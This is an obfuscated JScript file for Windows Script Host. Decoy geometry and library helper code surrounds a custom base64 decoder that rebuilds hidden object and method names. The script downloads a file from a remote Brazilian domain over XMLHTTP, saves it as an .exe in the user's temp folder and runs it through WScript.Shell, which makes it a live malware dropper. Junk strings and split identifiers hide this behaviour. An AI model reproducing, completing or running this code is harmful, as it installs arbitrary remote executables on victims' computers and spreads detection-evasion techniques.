
var smelting = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  obtainable = [];
	
var thinkpad = { ':': '.','U': 'S','381': 'X'};
	var jelsoft = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function peerage(demands) {
	dislocation = demands;
	for (var i in thinkpad){dislocation = dislocation.replace(i, thinkpad[i]);}
    return dislocation;
};

var hardihood = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.peerage4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("jackass").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = smelting[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = smelting[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = smelting[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = smelting[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var clearance ="jackassJVjackassRFTVjackassAl".peerage4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var diploma = "jackassQWjackassN0aXZjackasslWE9iajackassmVjdA=jackass=".peerage4();
String.prototype.peerage2 = function () {
    var ovation = {
        honeysuckle: this
    };
    ovation.grams = ovation.honeysuckle["c3Vic3RyaW5n".peerage4()](jelsoft, hardihood);
    return ovation.grams;
};

var jumps ="jackassRXhwYW5jackasskRW52aXjackassJvbm1lbnRTdHJjackasspbmdz".peerage4();
var Native = function(options){
	
};
var scouting = [diploma, jumps,clearance,  ""+"."+("continually","georgetown","outline","tractor","saracen","tobago","lioness","alchemy","exe"), "UnVu".peerage4(), peerage("M"+"SX"+"ML"+("disband","harass","hurries","vernacular","internship","fantasy","bituminous","2.")+"381M"+"LH"+"TT"+("components","engaged","rigged","adult","mongolian","claim","volvo","cataclysm","P>")+"WU"+("cheap","jeweler","merry","disposal","consolidated","neapolitan","undesirable","cr")+("glade","roumania","verona","lawsuit","sorry","fishy","cayman","bombastic","ip")+"t:"+("hundreds","andes","alchemists","negative","essentially","slighting","orchestra","internet","Sh")+"ell")];
instability = "_F2_";
var rawhide = this[scouting.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
EspkSsbb = "mHLHXQrhmJv";
seduction = (("publications", "chances", "perjury", "nominative", "poker", "uncontrollable", "marvel", "pqTVqGReM") + "oydYfW").peerage2();
taxes = (("pansies", "ugliness", "reuters", "moldova", "goody", "discretionary", "floyd", "christian", "subjective", "seAujzBk") + "oKgyYvfHFho").peerage2();
  
    String.prototype.collusion = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var lawrence = scouting.pop().split(">");

garbage = "b3Blbg==".peerage4();
var spider = new rawhide(lawrence[1]);
var cacao = new rawhide(lawrence[0]);
var transmitting = spider[scouting.shift()](scouting.shift());
weasel = "E";

var exercises = scouting.shift();
var recluse = scouting.shift();
function governance(remoteness, indonesian) {

    try {
        var sedimentary = transmitting + "/" + indonesian ;
		sedimentary = sedimentary+ exercises;
            cacao[garbage](("fundraising","indicator","G" + weasel) + ("vacuum","benjamin","cellular","recluse","T"), remoteness, false);
       
    sSlzVoRW = "_F7_";
    cacao[taxes + ("stand","guiana","end")]();
	var holly=("seduction" + WScript=="seduction" + "V2luZG93cyBTY3JpcHQgSG9zdA==".peerage4())&&cacao["c3RhdHVz".peerage4()] +""=="MjAw".peerage4()&&typeof(HHRTgcL)==="undefined";
	lQHNgR = "_F8_";
    if (holly) {
		
        var impartially = new rawhide((("bouquet","moira","sawmill","subsist","collectibles","penis","madcap","coins","A")+("capriciously","polls","winsome","pregnancy","coordinator","valley","areas","trainers","SEOO")+"DB"+("accessory","apnic","consecutive","tickle","gashed","overloaded","atrocity",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        impartially[garbage]();
        mRNIVbU = "_F9_";
        impartially.type = hardihood;
        FNFiQxQQxR = "_F10_";
        impartially["d3JpdGU=".peerage4()](cacao[("craters","jackson","fleming","conscription","xhtml","relent","requirement","")+"R"+"es"+"pon"+thinkpad['U'].toLowerCase()+"e"+"Qm9keQ==".peerage4()]);
        oTmlImP = "_F11_";
        impartially[(seduction + "o"+("convalescent","keynote","stake","feign","warnings","survival","families","pharmacies","00")+("lectures","fortune","widescreen","missed","firms","dexterously","course","8i")+"tion").replace("0"+("award","bristling","adamant","upholstery","mesquite","prizes","tracked","08"), taxes)] = 0;
        cnDSstssp = "_F12_";
        impartially.saveToFile(sedimentary, 2);
        OwQpNqAmN = "_F13_";
        impartially.close();
        jQbvoQwu = "_F14_";
		spider[recluse](sedimentary, hardihood, true);
    }
} catch (FevfuR) { };

    bUmOyeBq = "_F15_";
}
try{
governance("aHR0cDovLw==".peerage4()+"\u0075\u006E\u0069\u006A\u006F\u0076\u0065\u006D"+"\u002E\u0063\u006F\u006D\u002E\u0062\u0072\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?utYfUKwyxx=miDAWWs","usqwwqoFaY");}catch(epKLSxwoeUH){}

   HWGlSqKQALR = "_F16_";
   